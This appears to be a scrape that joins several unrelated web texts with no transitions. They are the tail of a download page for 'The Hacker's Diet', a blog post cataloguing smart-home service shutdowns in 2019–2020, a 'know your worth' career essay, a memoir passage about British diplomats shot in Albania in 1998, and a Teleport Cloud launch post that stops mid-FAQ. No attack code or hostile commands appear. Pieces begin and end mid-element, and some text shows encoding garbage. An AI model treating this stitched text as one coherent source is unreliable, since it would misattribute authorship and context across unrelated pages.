reading device according to the manufacturer's directions.  For the
iPad and iPhone (etc.), just drag the downloaded
<tt>hackdiet.epub</tt> file to iTunes, where you should see it in the
“Books” section.  Then connect your reading device to the
computer and the book should be transferred to it by the Sync
process.  If the book is not installed, make sure that you've enabled
syncing books to that device, and that if you've opted not to sync all
books in your library to the device, that <cite>The Hacker's
Diet</cite> is checked to be copied.  You must also, of course, have
the Apple
<a href="http://en.wikipedia.org/wiki/IBooks" target="Hackdiet_Aux">iBooks</a>
application installed on the device; if it's missing, go to the App
Store and install it—it's free.
</p>

<p>
<cite>The Hacker's Diet</cite> EPUB edition contains no “Digital
Rights Management” constraints: you are free to install it on as
many devices as you wish, transfer it among them (if their hardware
and software so permit), and pass on copies to others.  It should be
compatible with any EPUB reader hardware and software which can open
standards-compliant unrestricted files.

If you prefer to read the book off-line, you can
<a href="https://www.fourmilab.ch/hackdiet/hdpdf.zip">download a PDF edition</a> (1.3 Mb, ZIP compressed)
which you
can read with the Adobe Reader utility,
available for most personal computers and Unix workstations,
which may be
<a href="http://get.adobe.com/reader/" target="Hackdiet_Aux">downloaded
free of charge</a> directly from the
<a href="http://www.adobe.com/" target="Hackdiet_Aux">Adobe Systems</a> Web site.
The PDF edition preserves all the formatting of
the original book, and permits point-and-click navigation
among chapters and to follow cross-references in the text.
</p>

<p>
Adobe is one of the most consistently irritating companies
on Earth with which to do business.  I'd like to give you
a nice button for downloading your own copy of Adobe Reader,
but they won't let me use the image without “registering”
and “licensing” it, which I'm certainly not going to do
in order to promote their product and its file format.

</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/hdps.zip">PostScript Edition</a></h2>

<p>
<cite>The Hacker's Diet</cite> was originally typeset
using <a href="http://www.tug.org/" target="Hackdiet_Aux">TeX</a> with the
<a href="http://www.latex-project.org/" target="Hackdiet_Aux">LaTeX</a>
macro package.  Camera-ready copy was generated
from PostScript created by the <tt>dvips</tt>
utility.  The PostScript edition is a single monolithic
file, almost 2.7 megabytes, containing the
entire book as originally typeset.  You can read it on-line
with a PostScript viewing program such as
<a href="http://www.cs.wisc.edu/~ghost/">GhostScript</a>
(which is free), or print it on any PostScript-compatible
printer.  <strong>Before sending this
file to a printer, consider that the book is almost
250 pages long!</strong>  This is a <em>big</em> print
job, which will consume lots of paper, toner, and,
potentially, good will of any colleagues with whom
you share the printer.  The PostScript edition may be
downloaded as either a <a href="https://www.fourmilab.ch/hackdiet/hdps.zip">ZIPped archive</a>
or a <a href="https://www.fourmilab.ch/hackdiet/hackdiet.ps.gz"><b>gzip</b> compressed Unix <b>tar</b>
file</a>; both are 702 Kb in length and uncompress to a 2.7
Mb PostScript file.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdietf.html">Third Edition (1994 Web Edition with Frames)</a></h2>

<p>
If your browser supports frames but isn't up to the demands
of the Fourth Edition, the original 1994 Web edition with
frames remains available.
It allows navigation with
a panel which lets you click chapter titles and go
directly to that chapter.  If, in addition, your browser
supports JavaScript, simply moving the mouse over a
footnote icon, like this one:
<a onmouseover="javascript:footOver(0);" href="https://www.fourmilab.ch/hackdiet/www/f/0.html"><img src="https://www.fourmilab.ch/hackdiet/www/i/foot.gif" width="15" height="15" alt="[Footnote]"></a>
will pop up a window containing the footnote.  Moving the
mouse over other footnotes displays them in the auxiliary window.
Browsers without JavaScript (or users who have disabled
JavaScript in their browsers) may display footnotes in
the main document window by clicking the footnote icon,
then use their browser's “Back” button to return to the
main text.
</p>

<h2><a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html">No-Frame Web Edition</a></h2>

<p>
<a href="https://www.fourmilab.ch/hackdiet/www/hackdiet.html"><img src="https://www.fourmilab.ch/hackdiet/www/figures/any_browser.gif" width="88" height="31" alt="Works with Any Browser"></a>
Users with browsers which do not support frames, or those
who prefer a more linear presentation in a single
window, may access a no-frame edition of <cite>The Hacker's
Diet</cite> with identical content to the frame-based book.
The no-frame edition includes the pop-up footnotes present
in the frame edition, but since few browsers which lack
frames are likely to support JavaScript, you can simply click
on the footnote icon to display it, then use the
“Back” button or keystroke to return to the text containing
the footnote.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Over the last decade there has been some really great software products that
have been shut down with little to no warning. This is getting so common that
someone created a website called <a href="https://killedbygoogle.com/">Killed by Google</a>.
After Google <a href="http://googlereader.blogspot.com/2013/03/powering-down-google-reader.html">shutdown Reader in 2013</a>, I spent months trying to find a replacement.
During this research I determined I should try to find solutions to services
I use everyday that wouldn’t be shut down in some board room over profit
margins.</p><p>About five years ago, I started researching smart home products and services
as well as automation software to use in my next home. I started to notice the
following trends:</p><ul><li>Software products and services being shutdown with no notice</li><li>No software updates for promised features or security fixes</li><li>Software updates that remove out of the box functionality (features/bricking)</li><li>Free software that suddenly requires a paid subscription</li><li>Companies are selling or hording your data.</li></ul><p>For the sake of relevancy let’s just cover what’s happened since the start of
2019.</p><h2 id="2019">2019</h2><h3 id="ecobee">ecobee</h3><p>When ecobee launched the <a href="https://www.amazon.com/ecobee-Switch-Smart-Amazon-Built/dp/B0798LCLJ5?tag=niemyjski-20">ecobee Switch+</a>
I became super interested in them due to the shear amount of sensors in a small
device. They had also stated there would be API support as well as it would be
integrated as a remote temperature sensor for an
<a href="https://www.amazon.com/ecobee4-Thermostat-Built-Sensor-Included/dp/B08BZTPMW1?tag=niemyjski-20">ecobee smart thermostat</a>.</p><p>It took most of 2019, before 15 of my ecobee switches got the firmware update
to be added to my thermostat but the delivered promise of api support never came.</p><h3 id="best-buy-insignia-shut-down">Best Buy Insignia shut down</h3><p>Best Buy <a href="https://www.theverge.com/2019/9/6/20853671/best-buy-connect-insignia-smart-plug-wifi-freezer-mobile-app-shutdown-november-6">quietly announced on <strong>September 6th</strong></a>
that it was shutting down it’s Insignia brand of smart home devices on
<strong>November 6th</strong>. App access would no longer be available rendering most of the
products unusable.</p><blockquote><p>The announcement has already been purged from the Best Buy Insignia website.</p></blockquote><h3 id="lowe-s-iris-shut-down">Lowe’s Iris shut down</h3><p>Lowe’s Iris platform first launched in 2012, offered free and paid subscription
options. An <a href="https://www.theverge.com/2019/2/2/18208407/lowes-iris-smart-home-platform-shutting-down-march-2019">announcement on <strong>January 31st</strong></a>
that it was shutting down on <strong>March 31st</strong>, rendering devices dead.</p><p>I’m happy they offered a program to trade in any purchased devices for a
prepaid credit card so users could migrate to a different solution.</p><blockquote><p>The announcement has already been purged from the Lowe’s Iris website.</p></blockquote><h3 id="chamberlain-myq-breaking-api-changes">Chamberlain MyQ Breaking API Changes</h3><p>When it comes to automating garage door openers there are few out of the box
solutions that work and are as popular as the
<a href="https://www.amazon.com/Smart-Garage-Opener-Chamberlain-MYQ-G0301/dp/B075H7Z5L8?tag=niemyjski-20">Chamberlain MyQ Smart Garage Door Opener</a>.</p><p>An open source project created a python library that many other open source
projects use to integrate with MyQ using the MyQ Api. Unfortunately the MyQ
team has broken this <a href="https://github.com/arraylabs/pymyq/issues/27">api multiple times</a>
in 2019 causing automations to break.</p><blockquote><p>I hesitate a little bit every time I see an MyQ app update on my phone. as
I’m always wondering if this will trigger my opener firmware to be updated
and break my home automations.</p></blockquote><p>It’s been a cat and mouse game between smart home developers and the MyQ team.</p><h3 id="stringify-shut-down">Stringify shut down</h3><p>Stringify was launched in 2014 and bought by Comcast in 2017. Fast forward 18
months later to <strong>April 8th</strong>, Stringify <a href="https://www.howtogeek.com/410576/stringify-is-shutting-down-after-five-years/">announces via email</a>
it will be shutting down new sign ups immediately and all data will be deleted
on <strong>July 8th</strong>.</p><blockquote><p lang="en" dir="ltr">Stringify has announced that it will be shutting down in the upcoming months. <a href="https://t.co/VFshmwCeKK">https://t.co/VFshmwCeKK</a></p>— Stringify (@StringifyIt) <a href="https://twitter.com/StringifyIt/status/1115370840353202177?ref_src=twsrc%5Etfw">April 8, 2019</a></blockquote><h3 id="sonos-bricking-devices">Sonos bricking devices</h3><p>In <strong>December</strong> it was <a href="https://www.theverge.com/2019/12/30/21042871/sonos-recycle-mode-trade-up-program-controversy">uncovered</a>
that Sonos was bricking devices upon agreeing to recycle your device or by
upgrading the speaker.</p><blockquote><p>Recycle Mode is a state your device enters 21 days after recycling
confirmation in the Sonos app. In Recycle Mode, all data is erased and the
device is permanently deactivated so you can safely and securely dispose of
it. Once a device is in Recycle Mode, it cannot be reactivated.</p></blockquote><p>This decision was <a href="https://www.theverge.com/2020/3/5/21166777/sonos-ending-recycle-mode-trade-up-program-sustainability">overturned</a> in <strong>March 2020</strong>.</p><h3 id="works-with-nest-shut-down">Works with Nest shut down</h3><p>Google <a href="https://blog.google/products/google-nest/helpful-home/">announced</a> on
<strong>May 7th</strong> that it would be shutting down <code>Works with Nest</code> on <strong>August 31st</strong>.
It was only after massive backlash that they <a href="https://blog.google/products/google-nest/updates-works-with-nest/">announced</a>
that they would continue to support integrations until they were available in
the new API’s backed by a single Google Account.</p><p>Current users have to be super careful not to migrate their existing Nest
accounts to the new Google account for fear of losing integrations. I believe
this migration and integration support for various hubs will be completed in
2021.</p><h3 id="wink-product-availability">Wink product availability</h3><p>For over five months users in the Wink ecosystem couldn’t purchase any new
<a href="https://www.amazon.com/Wink-WNKHUB-2US-Smart-home-White/dp/B01KW8WGZQ?tag=niemyjski-20">Wink devices</a>
due to <a href="https://www.howtogeek.com/409925/why-we-cant-recommend-wink-hubs-anymore/">product availability issues</a>.
This lasted from <strong>November 2018</strong> through <strong>March 2019</strong>.</p><h2 id="2020">2020</h2><h3 id="august-connect-firmware">August Connect firmware</h3><p>In early 2020, I received a firmware update that caused all five of my
<a href="https://www.amazon.com/dp/B0752VPHVK?tag=niemyjski-20">August Smart Lock Pro Connect Hubs</a>
from connecting to my Wi-Fi. Slowly but surely they’ve came online but every
now and then I’ll have one drop offline. Thankfully I have the Z-Wave version
and access the locks that way.</p><h3 id="dark-sky-shut-down">Dark Sky shut down</h3><p>On <strong>March 31st</strong> <a href="https://www.theverge.com/2020/3/31/21201666/apple-acquires-weather-app-dark-sky-shut-down-android-wear-os-ios">Apple acquired Dark Sky</a>
and announced it would be shutting down it’s API at the end of <strong>2021</strong>. A lot
of smart home users used the API to power weather automations.</p><blockquote><p>Apple did the right thing by giving users plenty of time to move off of the API.</p></blockquote><h3 id="ecobee-1">ecobee</h3><p>As stated in the 2019 section, when remote thermostat sensors support was
rolled out to the <a href="https://www.amazon.com/ecobee-Switch-Smart-Amazon-Built/dp/B0798LCLJ5?tag=niemyjski-20">ecobee Switch+</a>
via an firmware update. A few months later it was removed with a second firmware
update. Now only some of my switches are paired as a remote sensor to my
<a href="https://www.amazon.com/ecobee4-Thermostat-Built-Sensor-Included/dp/B08BZTPMW1?tag=niemyjski-20">ecobee smart thermostats</a>.</p><p>To make matters worse there is an unresolved server side bug that keeps
renaming any switch that has a custom defined name back to the serial number of
the device. This should never happen to a consumer device paired with cloud
outages leaves a lot to be desired from ecobee when it comes to software.
I recommend using ecobee’s HomeKit support to get around these limitations
where possible.</p><h3 id="home-assistant-breaking-changes-and-os-changes">Home Assistant breaking changes and OS changes</h3><p>In <strong>May</strong> the Home Assistant team <a href="https://www.home-assistant.io/blog/2020/05/26/installation-methods-and-community-guides-wiki/">announced</a>
that they were dropping support for generic linux installs without consulting
the community. This was a major change that left many users frustrated. It makes
sense that users should be using the managed Home Assistant operating system,
but a large portion of users installed it on Ubuntu and other linux operating
systems of which may have been used for other purposes.</p><blockquote><p>As the platform matures there will be less churn and breaking changes.</p></blockquote><p>As we near the 1.0 release of Home Assistant, we’ve seen more integrations
be removed as well as changes to the API surface. Although these are good
changes they still require work by end users. This is to be expected of pre
version 1.0 software.</p><blockquote><p>Although breaking changes do happen from time to time. You control the
updates on your own time, helping to limit breaking changes.</p></blockquote><h3 id="chamberlain-myq-breaking-api-changes-1">Chamberlain MyQ breaking API changes</h3><p>For the second year running the <a href="https://www.amazon.com/Smart-Garage-Opener-Chamberlain-MYQ-G0301/dp/B075H7Z5L8?tag=niemyjski-20">Chamberlain MyQ Smart Garage Door Opener</a> has had issues due to MyQ trying lock out users
from using the MyQ API. It has been a cat and mouse game between smart home
developers and the MyQ team.</p><h3 id="tuya-firmware-locking">Tuya firmware locking</h3><p>I love <a href="https://blakeniemyjski.com/blog/securing-smart-home-devices-with-esphome-and-home-assistant/">flashing retail devices</a>
from the stock firmware to ESPHome. I do this mainly for privacy and to ensure it
can be brought into Home Assistant easily. It appears there is a
<a href="https://github.com/ct-Open-Source/tuya-convert/wiki/Collaboration-document-for-PSK-Identity-02">new firmware</a>
on some Tuya devices that is preventing flashing causing vendor lock in to
unknown third party services. I can’t blame companies for wanting to lock down
the firmware, it just leaves little options for smart home integrations when
the company leaves the space.</p><h3 id="logitech-harmony-express-remote-shut-down">Logitech Harmony Express remote shut down</h3><p>On <strong>July 9th</strong> Logitech <a href="https://support.logi.com/hc/en-us/community/posts/360048494053">announced</a>
it was discontinuing the 15 month old smart remote control that cost $250. It
would also be shutting down the Alexa service on <strong>September 30th</strong>, rendering
the device useless to control by it’s main selling feature.</p><blockquote><p>Logitech is offering a free upgrade if you bought this product!</p></blockquote><h3 id="wink-subscription">Wink Subscription</h3><p>On <strong>May 20th</strong> Wink <a href="https://blog.wink.com/wink-blog/2020/5/6/introducing-wink-subscription">announced</a>
that it would start charging all users $4.99 a month. Failure to subscribe
would result in severely limited functionality, pretty much forcing users to
upgrade in order to add or edit devices, add automations, or use voice control.</p><h3 id="ifttt-subscription">IFTTT Subscription</h3><p>On <strong>September 10th</strong> IFTTT <a href="https://ifttt.com/explore/introducing_ifttt_pro">announced</a>
a pro plan that costs $9.99 a month. The existing free plan would be severely
limited to 3 applets.</p><h3 id="smart-things-classic-shut-down">Smart Things Classic shut down</h3><p>On <strong>June 24th</strong> SmartThings <a href="https://community.smartthings.com/t/update-on-smartthings-classic-shutdown/213037">announced</a>
that SmartThings classic will be shutting down on <strong>December 1st</strong> . All users
who haven’t migrated to the new SmartThings API will have major disruptions
(e.g., your integrations will be deleted).</p><h3 id="wemo-cloud-only">Wemo cloud only</h3><p>On <strong>May 26th</strong> Wemo <a href="https://www.androidpolice.com/2020/05/26/wemo-is-replacing-its-awful-network-based-smart-home-management-with-online-accounts/">announced</a>
<code>Wemo Accounts</code>, a new way to manage all of your devices with an online account.</p><blockquote><p>The new account system shifts all of the device management away from your
local network and onto cloud services, which should reduce problems with the
Wemo apps and integrations with third-party services. However, account
creation is currently broken, which is very on-brand for Wemo.</p></blockquote><h2 id="conclusion">Conclusion</h2><p>It’s worth looking at all the services and products that were shut down and
disappeared like they never even existed. Some of these products and service
had amassed hundreds of thousands of users. Is there an emerging pattern? Would
you ever trust this company again?</p><p>I recommend buying devices that can be controlled locally though ESPHome, mqtt,
Thread, Zigbee or Z-Wave. Stay away from products that use a vendor specific
protocol especially if the company has a history of shutting down services or
products. I’d also avoid large investments in new products by any company
unless they have a positive track record or can be controlled via a standard.</p><blockquote><p>If an online service doesn’t charge you a monthly fee, you are the product.
Products that have a free cloud dependency have to find a way to turn a
profit or they will shut down. Someone has to pay for the cloud services.</p></blockquote><p>I do feel comfortable sticking with HomeKit supported devices as I can control
them locally and Apple has a good track record of privacy, supporting devices,
and part of HomeKit was <a href="https://github.com/apple/HomeKitADK">open sourced</a> too.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>The story I am going to share below has so many variations, but the lesson is always the same. This specific version I got from <a href="https://twitter.com/Shadaya_Knight_/status/1327881911214157825">Twitter</a>:</p><p>A father said to his son: "You've graduated with honors, here is a car (Nissan Skyline R34) that I bought years ago, it's old. BUT before I give it to you, take it to the USED CAR STORE &amp; tell them you want to sell it &amp; see how much they offer you. The son went to the USED CAR STORE, returned to his father &amp; said: "They offered me $1000 because it looks very worn out". The father said, "Now take it to the PAWN SHOP"...</p><p>The son went to the PAWN SHOP &amp; returned to his father &amp; said: "The PAWN SHOP offered $100 because it's a very old car". Then the father asked the son to go to a CAR CLUB &amp; show them the car. The son took the car to the CAR CLUB &amp; told his father: "Some people in the club offered as much as $100 000 for it since it's a NISSAN SKYLINE R34, an ICONIC car &amp; sought after by many"...</p><p>Then the father replied: "I wanted to let you know that the right place values you in the right way. Don't find yourself in the wrong place and get angry if you are not valued. Those that know your value are those who appreciate you, don't stay in a place where nobody sees your value. KNOW YOUR WORTH"</p><p>...</p><p>Immediately after graduating from college with a CS degree, I was on the hunt for a developer job. Lucky enough and through some personal connection I was able to land a front-end developer role.</p><p>I was so happy to have gotten that job that I did lowball myself when asked how much do I want to get paid...At that time I was interning and I was being paid $20 an hour...so I said to myself let's just say anything between $22/hr to $25/hr ...Guess what! That's exactly what I got paid. I met the president of the company after an interview, and after reviewing my offer he said...something like... what I said for my offer is around the same salary range people at the company start with ...They sent me an official offer letter just a few days after that...and I was offered $45k a year...You can imagine what was going through my mind...I lowballed myself...Why did I say $22/hr? ...I was happy to get the job but was kinda sad that I didn't capitalize on the opportunity. The reason was mainly that after graduation I was kinda desperate to get a job...I was out of the school dorms, I needed to have my own place, I needed to take care of my own expenses. So I was just ready for anything that would pay me.</p><p>After like 5 months of working in this job I wasn't so happy...I felt as if what I was doing did inspire me enough...That, plus a few other personal reasons led me to quit my job. Where I was interning when I was in college...by the time I was ending my time before my full-time job, the boss had upped my salary to $30/hr. What I was doing to my boss at the internship place was valuable enough for him to increase my salary without even asking and just after 5 months of working for him. This was one of the greatest lessons I learned...that Know Your Worth...There will be places where your skills are valued higher than other places. Find those places and people who value your skills.</p><p>...</p><p>Here is another story I had read a few months ago...it goes like this...There was a marathon in one of the US cities, and two people put their table stands where the runners would pass. One of them had oranges and another one had donuts...Almost all runners passed by the oranges station to grab the oranges and continue their race. Almost none grabbed the donuts. The reason is plain clear...the tired runners wanted some refreshing fluid in their body at the time...you really can't imagine a marathon runner grabbing a donut in the middle of the race, it's just not fitting. A fresh orange was a better offer to the runners. While the donut person had good intentions...he/she wasn't there at the right moment. Actually, at the finish line of the race, most of the runners wished there were some donuts there to greet them...but unfortunately, a donut person was nowhere to be found. So while a donut would be so valuable once the race was over, the oranges pretty much saved the day in the middle of the race. Again, know your value...know where you will be valued.</p><p>Are you a designer in a company that thinks design work is not as important as developing (programming) ...just get out...and find a place where designers are valued. Are you a developer that think they're not as valued as the business side of the company...you have an opportunity to go somewhere where your skills will be valued and you will be compensated accordingly.</p><p>So folks that's the lesson of the day...KNOW THY VALUE</p><blockquote>Everyone is a genius. But if you judge a fish by its ability to climb a tree, it will live its whole life believing that it is stupid</blockquote>

Police convoy enroute to ambush spot</figcaption></figure></div><p>The convoy stopped and the police got out of their vehicles and I joined them. Some started to cordon off the road while a number with automatic weapons spread out around the scene in some sort of haphazard search pattern looking for clues or traces of the culprits. After about half an hour just standing around, I asked my Embassy driver, Benny to ask the police if I could leave for the hospital to visit my colleagues. The senior policeman on the scene agreed but said he wanted me to visit police HQ later that day to make an initial statement.</p><p>After agreeing to do so and telling them that until further notice Benny would be my official interpreter for the time being, both he and I jumped in our vehicle and headed for the hospital in Tirana. I could see that Benny was nervous. Dealing with all of this was definitely not part of his job description. He was doing a great job not only as a driver putting himself in what might have been a potentially dangerous situation but also with helping out with the police.</p><p>About an hour later, after an uneventful trip, we arrived at the main hospital in Tirana. Benny and I went in and were taken to where the Deputy Head of Mission (DHM) and the Management Officer (MO) were being patched up. The doctor explained (via Benny) that the DHM was lucky, the bullet had gone through the fleshy part of her arm without breaking any bones or damaging any nerves. The doctor wanted to keep her in, but she was insistent of going home once the treatment was completed.</p><p>As for the MO, he was extremely lucky. When the bullet hit him, it had spent a lot of its force going through the window then the DHMâ€™s arm and upholstery before finally grazing him along the stomach resulting in blood loss. He too was insistent on discharging himself after treatment and going home. As for me, I was still in a state of disbelief that out of all the bullets fired, only one had done all this damage.</p><p>I had by then briefed both him and the DHM about what the police were currently doing plus the fact that I now had to go to police HQ to make a statement. I got Benny to call a second Embassy driver to bring the other armoured vehicle to the hospital to take both the DHM and MO home. We agreed that after I had been to police HQ, we would all meet up later in the DHMâ€™s house.</p><p>With that, Benny and I set off for police HQ. When I got there, I found that there were a small number of Albanian government officials gathered around a desk with senior police officers. Again thanks to Benny, I managed to give them a written statement of sorts as to what had happened.</p><p>After giving the statement, I was told to wait in another room. After about thirty minutes twiddling my thumbs, I was taken outside to a courtyard where a large number of heavily armed police were assembled. I wondered what was going on and asked Benny to try and find out, but nobody was talking.</p><p>Suddenly a door opened at the far end of the courtyard and a long file of men entered. They were directed to line up against the brick wall facing us. The police then told Benny that these men had been seized on and around the mountain during the police sweep.</p><p>Apparently, a number of them were well known to the police who described them as “hardened criminals” and the police were confident that one or several of them were definitely the culprits. When Benny told me all of this, I was not so certain.</p><p>Were these guys some sort of token show to prove the police were on the ball? How could I identify someone who was masked? I did not know for certain if there was just one man or a number of others involved in the shooting and I made a point of telling the police this.</p><p>They were not convinced or put off and they then asked me to go down the line and look at them. I refused and told them again I could not identify someone who had been wearing a mask throughout the incident?</p><p>However, one of the government officials sidled up to me and in perfect English said it was the custom and part of their procedures that a line up had to take place. Even if I could not identify anyone, the police would still hold and question them.</p><p>Of course, this being Albania at that time, there was no hiding behind a one-way mirror or any other form of masking my identity as a witness, so reluctantly, I started down the line. They were a dishevelled bunch and did not look too happy to be standing there. I had to stop in front of each one and say, “no, I was not sure and I could not be certain that this was the culprit”.</p><p>They all stared straight ahead and as I stopped in front of each individual and made my declaration, they all looked me straight in the eye, which was pretty unnerving to say the least.</p><p>Finally, I came to the end of the line. I again confirmed that I could not positively identify anyone and asked if I was free to go as I needed to meet up with my two colleagues. The police agreed and with a great deal of relief, both Benny and I left and headed for the DHMâ€™s house.</p><p>We made good time and when we reached her house, we found that she had already informed London of events. Word had quickly spread amongst the small diplomatic community in the city and she was dealing with well-wishers from her circle of diplomatic friends and also officials from the Albanian government who were in attendance.</p><p>I then briefed the DHM on what I had experienced at the Police HQ and seeing that she was going to be well looked after I set off with Benny to see the MO at his residence. It turned out that the MO was not at home but ensconced in the London Bar (a favourite watering hole for the small number of foreigners in Tirana at that time) regaling all and sundry with what had happened and showing everyone his battle scar.</p><p>What a guy, his prescription for a traumatic day, a couple of stiff drinks to settle the nerves in the face of adversity so to speak. Unfortunately, it turned out to be a lot more than a couple of quick drinks as more and more people turned up in the bar as the news spread to hear the story, see the MOâ€™s war wound and of course buy us more drinks (for medicinal and recuperative purposes of course) which were gratefully received.</p><p>In the end, they never did catch anyone. The shootings made the front page of the UK press and I was pretty sure the incident had been an embarrassment to the Albanian government who had seen virtually the whole UK establishment of the British Embassy (at that time there was only 4 <strong>British diplomats</strong> in residence) nearly wiped out on what was supposed to be (on their assurances) a safe route.<a href="https://www.independent.co.uk/news/albanian-gunmen-wound-british-diplomats-1156205.html">https://www.independent.co.uk/news/albanian-gunmen-wound-british-diplomats-1156205.html</a></p><p>Locally, there was a lot of speculation and gossip about the event. People could not get their heads around the fact that even the local bad guys would not be stupid enough to hold up a diplomatically plated vehicle as this action would be sure to bring a firestorm of police activity down on them.</p><p>A story went around that we were in fact carrying a lot of cash and the purpose of our trip to the mountain was to buy back looted weapons (looted from military arsenals during civil unrest the previous year) from criminal elements in order to get them off the street as part of some sort UK government initiative.</p><p>Another story was that we went to meet some members of the nascent Kosovo Liberation Army in order to deliver a substantial amount of cash to aid them in their struggle against the Serbs in Kosovo.</p><p>Both stories of course were complete rubbish. However unglamorous, the fact was that we were the unlucky victims of an armed robbery/carjack that went wrong, we just happened to be in the wrong place at the wrong time. For me, I never did reconcile the fact that the only person actually physically robbed was myself, the lowest grade and the lowest paid of the whole party. Where is the justice in that? I dined out on that story for many a month to come.</p><p>In the days that followed, the DHM was evacuated back to the UK for further medical treatment. The FCO had managed to locate the holidaying Ambassador and he returned to post and both the MO and I went back to work as normal.</p><p>It is important to remember that this was the Albania of 1998 and not the Albania of 2020. I only spent a year in Tirana before my next posting to Kosovo but what an eventful year it turned out to be.</p><p>It was a time of change and upheaval. After decades of the brutal and repressive Hoxha communist regime, followed by the great national pyramid scheme which impoverished hundreds of thousands of Albanians not used to such criminal schemes losing everything, no wonder the country erupted into mass civil unrest.</p><p>But moving on from those dark days, I have been back to Albania twice since then. It is a beautiful and stunning country rich in history and the developing coastline is a tourist paradise. I still have friends from our embassy, local staff who I keep in contact with regularly even to this day via social media. If you ever get the chance…..go visit, you will not be disappointed.</p><p><a href="https://www.mydiplomaticlife.com/sas-rescue-trapped-diplomats-in-albania/">SAS Rescue 3 Trapped British Diplomats in Albania</a></p><p><a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p><a href="https://www.mydiplomaticlife.com/bloodshed-avoided-at-queens-birthday-party-in-tirana/">Bloodshed Avoided At Queens Birthday Party In Tirana</a></p></div></div>]]>

      <a href="https://goteleport.com/blog/index.xml"><i></i></a>
      
      

        

<p><img src="https://goteleport.com/blog/images/2020/teleport-cloud-header.png" width="100%" alt="access points revollving around Teleport"></p>

<p>This blog post marks an important milestone for us! Just four years ago, as we grew frustrated with the state of SSH server access, Teleport was born. Eventually it grew way bigger than just SSH access, as our users want to use the same access workflow for all layers of their stacks.</p>

<p>And today we’re announcing another way to use Teleport: as a hosted offering. Let’s dig deeper!</p>

<h2 id="what-is-teleport">What is Teleport?</h2>

<p>For those who don’t know, Teleport is an open-source <a href="https://goteleport.com/teleport/">Unified Access Plane</a>, i.e. a smart proxy that understands all common remote access protocols. We’ve started with SSH and are adding others quickly. Available as a <a href="https://goteleport.com/teleport/download/">single binary download</a>, it allows engineers to access their servers, Kubernetes clusters, or internal web applications (dashboards, etc) regardless of where they are - on any cloud, behind NAT, in a self-driving car, anywhere.</p>

<p>Teleport started as an experiment of using Golang’s first-class SSH facilities for our own SSH access needs. Other companies noticed, and in just a couple of years it’s gone from just a handful of early adopters to organizations like NASDAQ, Snowflake, and IBM trusting Teleport to access their environments across any infrastructure.</p>

<p>Teleport gives the industry best practices for secure access by default: the SSH proxy, identity-centric authentication, <a href="https://goteleport.com/blog/enhanced-session-recording/">session recording</a>, structured <a href="https://goteleport.com/resources/videos/webinar-kubernetes-audit-logging/">audit log</a>, etc. This is how <a href="https://goteleport.com/blog/how-to-ssh-properly/">SSH is done properly</a> at Silicon Valley unicorns, usually with something built in-house. We wanted Teleport to be the standard access solution for the rest of the world.</p>

<p>Then we discovered that Kubernetes users face similar challenges and Teleport added support for <a href="https://goteleport.com/teleport/kubernetes/">Kubernetes access</a>, gradually turning into a multi-protocol access plane.</p>

<p>We always believed that <em>bad user experience and complexity are the biggest obstacles to good security</em>. That is why Teleport was designed to be simple and easy to use.</p>

<h2 id="cloud-early-access">Cloud Early Access</h2>

<p>From the beginning, we have adopted the design mindset to “do the right thing by default” to minimize the need for configuration and to reduce operational overhead of running Teleport on your infrastructure.</p>

<p>As easy as it is, some users still preferred that we do it for them. There’s a huge distance between “easy” and “one click away” and today, we’re closing this gap.</p>

<p>We are announcing early access to Teleport Cloud. Teleport Cloud allows you to simply copy-paste a single CLI command on your servers, regardless of where they are, and you’ll get SSH and Kubernetes access to all of your environments with industry best practices for security and compliance. Our security and compliance experts will run and manage the Unified Access Plane for you.</p>

<p>When we say all of your environments, we literally mean any computing device on planet Earth. Teleport Cloud gives you remote access connectivity into:</p>

<ul>
<li>Cloud and on-premise environments</li>
<li>IoT devices running on your customer’s premises behind NAT</li>
<li>Edge environments</li>
</ul>

<p>What do we mean by remote access connectivity? We mean full support for the following protocols:</p>

<ul>
<li>SSH</li>
<li>Kubernetes API</li>
<li>HTTPS for accessing internal web apps</li>
<li>Databases (coming soon)</li>
</ul>

<p>We called it Teleport because we wanted to get as close as possible to defeating the laws of physics. In other words, we set out to erase the annoying boundaries that currently exist between cloud providers and networks.</p>

<h2 id="how-does-it-work">How does it work?</h2>

<p>The underlying technology behind Teleport Cloud is reverse tunnels. A reverse tunnel is a persistent secure connection established by your servers into the Teleport control plane hosted by the team at Teleport.</p>

<p>When you type <code>ssh <a href="https://goteleport.com/cdn-cgi/l/email-protection" data-cfemail="2e5b5d4b5c6e40414a4b">[email&nbsp;protected]</a></code>, the Teleport client connects to the node via the SSH proxy hosted by us. The proxy routes your connection to the node using the tunnel. This allows you to SSH into nodes that are running behind NAT, even on third party infrastructure. This technology can be used not only to deploy software into your own clouds, but also to update software or firmware on appliances running in your customer’s clouds or even in their basements.</p>

<p>You can also log in into your Teleport Cloud account to access servers, review audit logs, and configure role-based access via the control panel. The audit log deserves a special mention. Having a centralized audit log with recorded sessions and instant visibility into your environment has always been a major reason for organizations to adopt Teleport.</p>

<p>The diagram below shows how this works:</p>

<p><img src="https://goteleport.com/blog/images/2020/teleport-cloud-1.png" width="100%" alt="how teleport cloud works"></p>

<p>Teleport Cloud is running on AWS. The audit logs are encrypted at rest and stored in DynamoDB and Amazon S3. We have also taken some measures to isolate Teleport Cloud tenants, so every Teleport Cloud instance is an isolated single tenant and is running as a standalone process with SELinux profile and a separate kIAM role using the industry <a href="https://github.com/gravitational/workshop/blob/master/k8ssecurity.md">best security practices</a>.</p>

<h2 id="faq">FAQ</h2>

<p><strong>Q: Can the Teleport Team decrypt and see my SSH traffic?</strong>
<strong>A:</strong> No. We cannot see your SSH traffic, because encryption happens end-to-end, i.e. from your client machines to your servers.</p>

<p><strong>Q: Early Access? Is this production-ready?</strong>
<strong>A:</strong> Teleport itself has been in production at organizations like Samsung, Snowflake, and IBM, and Teleport Cloud is the same product, just hosted by us. We are hand-selecting early Cloud users because Teleport Cloud isn’t yet available in every geographic region and also because we want more UX feedback before we make it generally available.</p>

<p><strong>Q: Can I use Teleport Cloud Preview in production?</strong>
